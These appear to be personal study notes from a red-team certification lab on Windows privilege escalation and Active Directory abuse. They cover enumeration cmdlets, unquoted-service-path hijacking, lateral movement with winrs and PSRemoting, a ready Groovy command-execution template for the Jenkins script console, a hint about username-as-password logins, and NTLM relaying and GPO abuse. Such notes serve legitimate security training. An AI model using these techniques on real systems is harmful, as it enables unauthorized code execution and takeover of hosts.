# Privilege Escalation

## Tools
- [PowerUp](https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc)
    - `Invoke-AllChecks`
- [Privesc](https://github.com/itm4n/PrivescCheck)
    - `Invoke-PrivEscCheck`
- [winPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS)
    - `winPEASx64.exe`

## Local Privilege Escalation
- `Get-ServiceUnquoted -Verbose`-> Get services with unquoted paths and a space in their name.
- `Get-ModifiableServiceFile -Verbose` -> Get services where the current user can write to its binary path or change arguments to the binary
- `Get-ModifiableService -Verbose` -> Get the services whose configuration current user can modify
- `Get-WmiObject -Class win32_service | select pathname`

## Find Local Admin Access
`. C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1`
Run `Find-PSRemotingLocalAdminAccess`
```
Find-PSRemotingLocalAdminAccess
dcorp-std214
dcorp-adminsrv
```

Use winrs to connect to dcorp-adminsrv
```
winrs -r:dcorp-adminsrv cmd
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Users\studentx> set username
set username
USERNAME=studentx

C:\Users\studentx>set computername
computername
COMPUTERNAME=dcorp-adminsrv
```
or to connect with PowerShell remote:
`Enter-PSSession -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.local`
`$env:username`

### Vulnerabilities

<img src="/home/farel/Documents/Personal Projects/Learning Notes/CRTP/resources/vuln-service.png">

- If there are no quotes around the path as shown above and there is a space such as shown above, then if an executable named <b>Abyss</b> is inserted at C:\WebServer\Abyss, then the service will run the custom executable instead.
- See if able to overwrite <b>abyssws.exe</b> or change the <b>-service</b> argument
- `sc.exe sdshow snmptrap`

## Feature Abuse

### Jenkins
Running on <b>dcorp-ci</b> (172.16.3.11) on port 8080 in the lab

Many jenkins user have their username as their password.

Running commands on Jenkins Master:
- `http://<jenkins_server>/script`
- Groovy scripts:
```
def sout = new StringBuffer(), serr = new StringBuffer()
def proc = '[INSERT COMMAND]'.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println "out> $sout err> $serr"
```
- Add a build step, add "Execute Windows Batch Command", enter `powershell -c <command>`

## Relaying
Target credentials are not captured, but forwarded to a local or remote service for authentication
- NTLM relaying
- Kerberos relaying

LDAP and AD CS are the two most abused services for relaying

## GPO Abuse
A GPO with overly permissive ACL can be abused for multiple attacks

### GPOddity
Combines NTM relaying and modification of Group Policy Container by relaying credentials of a user who has WriteDACL on GPO to modify the path (gPCFileSysPath) of the group policy template (default is SYSVOL), which enables loading of malicious template
